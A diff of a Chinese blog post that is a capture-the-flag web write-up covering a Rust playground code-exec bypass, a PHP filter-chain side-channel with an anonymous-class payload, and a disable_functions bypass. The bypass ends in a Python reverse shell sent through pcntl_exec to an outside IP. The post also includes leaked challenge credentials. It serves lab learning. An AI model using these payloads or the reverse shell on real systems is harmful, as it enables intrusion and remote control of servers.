@@ -72,7 +72,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezphp-Unsolved"><span class="toc-number">2.</span> <span class="toc-text">ezphp (Unsolved)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#noauth-%E8%BF%9F%E6%9D%A5%E7%9A%84Solve"><span class="toc-number">3.</span> <span class="toc-text">noauth (迟来的Solve)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">正解</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#playground"><span class="toc-number">2.</span> <span class="toc-text">playground</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezphp-%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">ezphp (复现)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#noauth-%E8%BF%9F%E6%9D%A5%E7%9A%84Solve"><span class="toc-number">4.</span> <span class="toc-text">noauth (迟来的Solve)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95disable-function"><span class="toc-number">4.1.</span> <span class="toc-text">绕disable_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simp1escape%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">Simp1escape（Unsolved）</span></a></li></ol>
     </div>
   
         
@@ -246,7 +246,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">968字</span>
+        <span class="post-count">1.5k字</span>
       </span>
     </span>
 
@@ -255,7 +255,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">4分</span>
+        <span class="post-count">7分</span>
       </span>
     </span>
     
@@ -270,11 +270,95 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>奇异题目两则</p>
-<p>两题都和蓝帽有点关系，唉蓝帽</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录奇异题目三则</p>
+<p>其中两题都和蓝帽有点关系，唉蓝帽</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://nlrvana.github.io/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/">https://nlrvana.github.io/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/</a></p>
 <span id="more"></span>
 
-<h1 id="ezphp-Unsolved"><a href="#ezphp-Unsolved" class="headerlink" title="ezphp (Unsolved)"></a>ezphp (Unsolved)</h1><blockquote>
+<h1 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h1><blockquote>
+<p>Rust</p>
+</blockquote>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[macro_use]</span> <span class="token keyword">extern</span> <span class="token keyword">crate</span> <span class="token module-declaration namespace">rocket</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>fs<span class="token punctuation">;</span>  
+<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>  
+<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">Write</span><span class="token punctuation">;</span>  
+<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>process<span class="token punctuation">::</span></span><span class="token class-name">Command</span><span class="token punctuation">;</span>  
+<span class="token keyword">use</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token class-name">Rng</span><span class="token punctuation">;</span>  
+  
+<span class="token attribute attr-name">#[get(<span class="token string">"/"</span>)]</span>  
+<span class="token keyword">fn</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span>  
+    <span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token function">read_to_string</span><span class="token punctuation">(</span><span class="token string">"main.rs"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap_or</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token attribute attr-name">#[post(<span class="token string">"/rust_code"</span>, data = <span class="token string">"&lt;code>"</span>)]</span>  
+<span class="token keyword">fn</span> <span class="token function-definition function">run_rust_code</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">String</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">if</span> code<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"std"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token string">"Error: std is not allowed"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+    <span class="token comment">//generate a random 5 length file name  </span>
+    <span class="token keyword">let</span> file_name <span class="token operator">=</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">thread_rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">sample_iter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token namespace">rand<span class="token punctuation">::</span>distributions<span class="token punctuation">::</span></span><span class="token class-name">Alphanumeric</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">::</span>from<span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token keyword">mut</span> file<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;.rs"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        file<span class="token punctuation">.</span><span class="token function">write_all</span><span class="token punctuation">(</span>code<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span>build_output<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token class-name">Command</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"rustc"</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;.rs"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-C"</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"debuginfo=0"</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-C"</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"opt-level=3"</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-o"</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">if</span> <span class="token operator">!</span>build_output<span class="token punctuation">.</span>status<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+            <span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token function">remove_file</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;.rs"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from_utf8_lossy</span><span class="token punctuation">(</span>build_output<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">as_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>  
+    <span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token function">remove_file</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;.rs"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token class-name">Command</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">if</span> <span class="token operator">!</span>output<span class="token punctuation">.</span>status<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+            <span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token function">remove_file</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from_utf8_lossy</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">as_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>  
+            <span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token function">remove_file</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"playground/&#123;&#125;"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>file_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from_utf8_lossy</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">as_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>  
+    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token attribute attr-name">#[launch]</span>  
+<span class="token keyword">fn</span> <span class="token function-definition function">rocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> _ <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">let</span> figment <span class="token operator">=</span> <span class="token namespace">rocket<span class="token punctuation">::</span></span><span class="token class-name">Config</span><span class="token punctuation">::</span><span class="token function">figment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
+        <span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"address"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token namespace">rocket<span class="token punctuation">::</span></span><span class="token function">custom</span><span class="token punctuation">(</span>figment<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token macro property">routes!</span><span class="token punctuation">[</span>index<span class="token punctuation">,</span>run_rust_code<span class="token punctuation">]</span><span class="token punctuation">)</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>没怎么玩过rust，但是一眼可以看出过滤<code>std</code>，有 &#x2F;rust_code 路由</p>
+<p><code>rustc</code>的操作大概是我们传代码就会执行的意思</p>
+<p>那么让gpt写个外部的c语言代码命令执行就行（</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">fn</span> <span class="token function-definition function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token keyword">u8</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">i32</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token comment">// Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作</span>
+    <span class="token keyword">unsafe</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="ezphp-复现"><a href="#ezphp-复现" class="headerlink" title="ezphp (复现)"></a>ezphp (复现)</h1><blockquote>
 <p>php侧信道</p>
 </blockquote>
 <p>php8.3.2</p>
@@ -287,11 +371,12 @@
 <span class="token punctuation">&#125;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>明显是在 hash_file 上做文章，能想到的也就是侧信道攻击</p>
+<p>明显是在 hash_file 上做文章，能想到的也就是侧信道攻击，原理：<a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle">https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</a></p>
 <p>exp：<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
-<p>原理：<a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle">https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</a></p>
-<p><code>hash_file</code>函数也受到了这个影响</p>
-<p>侧信道爆出个参数 ezphpPhp8 就行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python filters_chain_oracle_exploit.py <span class="token parameter variable">--target</span> url <span class="token parameter variable">--file</span> flag.php <span class="token parameter variable">--parameter</span> f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>爆破过程依旧是稀烂的服务器回显错误重开</p>
+<p>只要能爆出个参数 ezphpPhp8 就行，flag.php传入参数</p>
 <p>flag.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ezphpPhp8'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -315,9 +400,22 @@
 <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>然后这里匿名类，销毁变量，这下不会了</p>
+<p>然后这里的 $a 是匿名类，但是 unset 会销毁变量，这下不会了</p>
+<p>这个时候要找一下如何触发一个匿名类：<a target="_blank" rel="noopener" href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">https://hi-arkin.com/archives/php-anonymous-stdClass.html</a></p>
+<p>匿名类的类名与文件所在行列相关，即同一个位置实例出来的类为同一个类</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">class</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token comment">// class名为: 'class@anonymous'+chr(0)+php文件路径+行数$列数</span>
+<span class="token keyword">echo</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>那么构造我们的payload，注意有<code>%00</code>：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>flag<span class="token operator">.</span>php<span class="token operator">?</span>ezphpPhp8<span class="token operator">=</span><span class="token keyword">class</span>@anonymous<span class="token operator">%</span><span class="token number">00</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token operator">.</span>php<span class="token punctuation">:</span><span class="token number">7</span><span class="token variable">$0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>列数是随机的，得爆破一下，然后就能得到flag了</p>
 <hr>
-<h1 id="noauth-迟来的Solve"><a href="#noauth-迟来的Solve" class="headerlink" title="noauth (迟来的Solve)"></a>noauth (迟来的Solve)</h1><p>结果晚上八点才做出来（</p>
+<h1 id="noauth-迟来的Solve"><a href="#noauth-迟来的Solve" class="headerlink" title="noauth (迟来的Solve)"></a>noauth (迟来的Solve)</h1><blockquote>
+<p>pcntl绕disable_function</p>
+</blockquote>
+<p>感谢靶机不关之恩，晚上八点才做出来（</p>
 <p>进去一个登录验证</p>
 <p>扫出<a target="_blank" rel="noopener" href="http://www.zip,解压得到账密/">www.zip，解压得到账密</a></p>
 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[2022-01-01 12:34:56]  Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -344,8 +442,8 @@
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>不能直接命令执行，猜测php.ini里ban了</p>
-<p>查目录</p>
+<p>不能直接命令执行和phpinfo，猜测php.ini里disable_functions ban了</p>
+<p>那就用php自带的函数和类查目录</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?cmd=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%s"</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>&amp;file=glob:///*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>根目录下有flag，但是没权限读</p>
@@ -353,29 +451,15 @@
 <p><img src="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403161057466.png" alt="image-20240403161057466"></p>
 <p>记得下面的请求信息带上请求头Authorization：Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY&#x3D;</p>
 <p>然后不让上传文件打不了 ld_preload，回显 ret&#x3D;127 也不能执行命令</p>
-<p>看了一圈发现&#x2F;etc&#x2F;bash.bashrc有配置（不知道有没有关系）</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># if the command-not-found package is installed, use it</span>
-<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-x</span> /usr/lib/command-not-found <span class="token parameter variable">-o</span> <span class="token parameter variable">-x</span> /usr/share/command-not-found/command-not-found <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
-	<span class="token keyword">function</span> <span class="token function-name function">command_not_found_handle</span> <span class="token punctuation">&#123;</span>
-	        <span class="token comment"># check because c-n-f could've been removed in the meantime</span>
-                <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-x</span> /usr/lib/command-not-found <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
-		   /usr/lib/command-not-found -- <span class="token string">"<span class="token variable">$1</span>"</span>
-                   <span class="token builtin class-name">return</span> <span class="token variable">$?</span>
-                <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token parameter variable">-x</span> /usr/share/command-not-found/command-not-found <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
-		   /usr/share/command-not-found/command-not-found -- <span class="token string">"<span class="token variable">$1</span>"</span>
-                   <span class="token builtin class-name">return</span> <span class="token variable">$?</span>
-		<span class="token keyword">else</span>
-		   <span class="token builtin class-name">printf</span> <span class="token string">"%s: command not found<span class="token entity" title="\n">\n</span>"</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span>
-		   <span class="token builtin class-name">return</span> <span class="token number">127</span>
-		<span class="token keyword">fi</span>
-	<span class="token punctuation">&#125;</span>
-<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>翻到 &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</p>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">disable_functions</span> <span class="token punctuation">=</span> <span class="token value attr-value">eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>？怎么eval给ban了题目还能用，逆天</p>
 <p>翻数据库文件config.inc.php</p>
 <p><img src="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403200703842.png" alt="image-20240403200703842"></p>
 <p><img src="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403200638993.png" alt="image-20240403200638993"></p>
-<p>数据库连不上去，不知道是不是比赛结束的原因</p>
-<h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h2><p>翻扩展，发现了一个很新的pcntl</p>
+<p>数据库连不上去</p>
+<h2 id="绕disable-function"><a href="#绕disable-function" class="headerlink" title="绕disable_function"></a>绕disable_function</h2><p>翻扩展，发现了一个很新的pcntl</p>
 <p><img src="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403203753084.png" alt="image-20240403203753084"></p>
 <p>搜一下：发现是第四届蓝帽杯的原题，<code>pcntl</code>扩展绕disable_functions的操作：<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/228037.html">https://cn-sec.com/archives/228037.html</a></p>
 <p>弹shell</p>
@@ -385,9 +469,9 @@
 POST：
 1=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/usr/bin/python"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'-c'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("115.236.153.172",41678));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>然后网页会不可访问，不过能成功弹shell</p>
+<p>然后网页会502，不过能成功弹shell</p>
